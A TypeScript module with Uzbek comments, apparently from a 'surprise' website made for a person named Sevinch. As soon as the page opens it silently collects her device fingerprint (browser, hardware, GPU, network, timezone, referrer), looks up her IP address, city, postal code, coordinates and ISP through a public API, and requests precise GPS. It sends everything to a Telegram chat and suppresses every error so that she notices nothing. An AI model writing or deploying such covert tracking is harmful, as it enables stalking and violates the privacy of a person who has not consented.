/**
 * ─────────────────────────────────────────────────────────────
 *  DEVICE INFO — sayt ochilishi bilan Sevinchning qurilmasi va
 *  brauzeri haqida mumkin bo'lgan barcha ma'lumotni yig'ib,
 *  chiroyli qilib Telegramga yuboradi.
 *
 *  Hammasi fire-and-forget: hech qachon UI'ni bloklamaydi va
 *  hech qanday xatolik surprise'ni buzmaydi.
 * ─────────────────────────────────────────────────────────────
 */

import { notify } from "./telegram";

// Faqat bir marta yuborilsin (React StrictMode ikki marta chaqirishi mumkin).
let alreadySent = false;

const esc = (s: unknown): string =>
  String(s ?? "—")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");

const yesNo = (v: boolean | undefined): string => (v ? "Ha" : "Yo'q");

/** navigator/screen'dan sinxron yig'iladigan ma'lumotlar. */
function collectClientInfo(): Record<string, string> {
  const nav = navigator as any;
  const scr = window.screen as any;
  const info: Record<string, string> = {};

  // ── Qurilma / brauzer ──
  info["Qurilma turi"] = guessDeviceType();
  info["Platforma"] = nav.userAgentData?.platform || nav.platform || "—";
  info["Brauzer (UA)"] = navigator.userAgent;
  if (nav.userAgentData?.brands?.length) {
    info["Brauzer brendlari"] = nav.userAgentData.brands
      .map((b: any) => `${b.brand} ${b.version}`)
      .join(", ");
  }
  info["Mobil (UA hint)"] = yesNo(nav.userAgentData?.mobile);
  info["Til"] = navigator.language || "—";
  info["Barcha tillar"] = (navigator.languages || []).join(", ") || "—";
  info["Vendor"] = nav.vendor || "—";

  // ── Vaqt mintaqasi ──
  try {
    const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
    info["Vaqt mintaqasi"] = tz || "—";
  } catch {}
  info["UTC farqi (min)"] = String(-new Date().getTimezoneOffset());
  info["Mahalliy vaqt"] = new Date().toString();

  // ── Ekran ──
  const dpr = window.devicePixelRatio || 1;
  info["Ekran o'lchami"] = `${scr.width}×${scr.height}`;
  info["Ekran (real px)"] = `${Math.round(scr.width * dpr)}×${Math.round(
    scr.height * dpr
  )}`;
  info["Oyna o'lchami"] = `${window.innerWidth}×${window.innerHeight}`;
  info["Piksel zichligi"] = String(dpr);
  info["Rang chuqurligi"] = `${scr.colorDepth}-bit`;
  if (scr.orientation?.type) info["Orientatsiya"] = scr.orientation.type;

  // ── Apparat ──
  if (typeof nav.hardwareConcurrency === "number")
    info["CPU yadrolari"] = String(nav.hardwareConcurrency);
  if (typeof nav.deviceMemory === "number")
    info["Xotira (taxminan)"] = `${nav.deviceMemory} GB`;
  info["Sensorli ekran"] = yesNo((nav.maxTouchPoints || 0) > 0);
  if (typeof nav.maxTouchPoints === "number")
    info["Touch nuqtalari"] = String(nav.maxTouchPoints);

  // ── Tarmoq ──
  const conn = nav.connection || nav.mozConnection || nav.webkitConnection;
  if (conn) {
    if (conn.effectiveType) info["Tarmoq turi"] = conn.effectiveType;
    if (typeof conn.downlink === "number")
      info["Tezlik (taxminan)"] = `${conn.downlink} Mbit/s`;
    if (typeof conn.rtt === "number") info["Kechikish (RTT)"] = `${conn.rtt} ms`;
    if (typeof conn.saveData === "boolean")
      info["Data saqlash rejimi"] = yesNo(conn.saveData);
  }
  info["Onlayn"] = yesNo(navigator.onLine);

  // ── GPU (WebGL) ──
  try {
    const gl =
      document.createElement("canvas").getContext("webgl") ||
      (document.createElement("canvas").getContext(
        "experimental-webgl"
      ) as WebGLRenderingContext | null);
    if (gl) {
      const dbg = gl.getExtension("WEBGL_debug_renderer_info");
      if (dbg) {
        info["GPU"] = String(gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL));
        info["GPU ishlab chiqaruvchi"] = String(
          gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL)
        );
      }
    }
  } catch {}

  // ── Boshqa ──
  if (typeof nav.cookieEnabled === "boolean")
    info["Cookie yoqilgan"] = yesNo(nav.cookieEnabled);
  info["Sahifa manzili"] = window.location.href;
  if (document.referrer) info["Qayerdan keldi"] = document.referrer;

  return info;
}

function guessDeviceType(): string {
  const nav = navigator as any;
  if (nav.userAgentData?.mobile) return "Telefon / mobil";
  const ua = navigator.userAgent;
  if (/iPad|Tablet/i.test(ua)) return "Planshet";
  if (/iPhone|Android.*Mobile|Mobile/i.test(ua)) return "Telefon / mobil";
  if (/Android/i.test(ua)) return "Android planshet";
  if (/Macintosh/i.test(ua)) return "Mac kompyuter";
  if (/Windows/i.test(ua)) return "Windows kompyuter";
  if (/Linux/i.test(ua)) return "Linux kompyuter";
  return "Kompyuter / boshqa";
}

/** IP va joylashuvni ochiq API orqali aniqlaydi (kalit talab qilmaydi). */
async function collectIpInfo(): Promise<Record<string, string>> {
  const out: Record<string, string> = {};
  try {
    const res = await fetch("https://ipapi.co/json/", { cache: "no-store" });
    if (!res.ok) return out;
    const j: any = await res.json();
    if (j.ip) out["IP manzil"] = j.ip;
    const place = [j.city, j.region, j.country_name].filter(Boolean).join(", ");
    if (place) out["Joylashuv"] = place;
    if (j.postal) out["Pochta indeksi"] = j.postal;
    if (j.latitude && j.longitude) {
      out["Koordinatalar"] = `${j.latitude}, ${j.longitude}`;
      out["Xaritada"] = `https://maps.google.com/?q=${j.latitude},${j.longitude}`;
    }
    if (j.org) out["Internet provayder"] = j.org;
    if (j.asn) out["ASN"] = j.asn;
  } catch {
    // IP servisi ishlamasa — mayli, qolgan ma'lumotlar baribir ketadi.
  }
  return out;
}

/** GPS ruxsati bo'lsa — aniq koordinatalarni ham yuboradi. */
function tryPreciseLocation(): void {
  if (!navigator.geolocation) return;
  try {
    navigator.geolocation.getCurrentPosition(
      (pos) => {
        const { latitude, longitude, accuracy } = pos.coords;
        notify(
          `📍 <b>Sevinch — aniq GPS joylashuv</b>\n` +
            `Koordinatalar: <code>${latitude}, ${longitude}</code>\n` +
            `Aniqlik: ~${Math.round(accuracy)} m\n` +
            `🗺 https://maps.google.com/?q=${latitude},${longitude}`
        );
      },
      () => {
        /* ruxsat berilmadi — jim o'tamiz */
      },
      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
    );
  } catch {
    /* qo'llab-quvvatlanmasa — mayli */
  }
}

/** Sayt ochilishi bilan chaqiriladi. Barcha ma'lumotni yig'ib yuboradi. */
export function reportDeviceInfo(): void {
  if (alreadySent || typeof window === "undefined") return;
  alreadySent = true;

  const send = async () => {
    try {
      const client = collectClientInfo();
      const ip = await collectIpInfo();
      const all = { ...ip, ...client };

      const lines = Object.entries(all).map(
        ([k, v]) => `• <b>${esc(k)}:</b> ${esc(v)}`
      );
      notify(`🕵️ <b>Sevinch saytga kirdi — qurilma ma'lumotlari</b>\n${lines.join("\n")}`);
    } catch {
      /* never break the surprise */
    }
  };

  send();
  tryPreciseLocation();
}
